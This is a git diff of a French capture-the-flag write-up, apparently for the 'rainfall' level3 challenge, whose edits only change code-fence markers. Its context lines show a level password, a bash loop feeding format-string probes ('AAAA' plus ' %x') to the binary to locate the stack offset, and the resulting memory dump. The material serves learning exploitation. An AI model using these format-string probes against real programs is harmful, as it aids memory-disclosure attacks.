@@ -10,7 +10,7 @@ Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
 ## Source :
 
-```cpp=
+```cpp
 #include <stdio.h>
 #include <stdint.h>
 
@@ -52,7 +52,7 @@ Pour déterminer l'offset où la chaine `str` sera mise en mémoire, on peut lan
 `for((i=0; i<10; i++));do echo "Index $i" && python -c "print 'AAAA'+' %x'*$i" | ./level3; done`
 
 qui nous donnera ce résultat :
-```=
+```
 Index 0
 AAAA
 Index 1
@@ -76,7 +76,7 @@ AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825
 ```
 
 ou avec un script shell :
-```sh=
+```sh
 kali@kali:~/rainfall$ cat ./script.sh
 #!/bin/bash
 for ((i=0;  i < 200; i++))
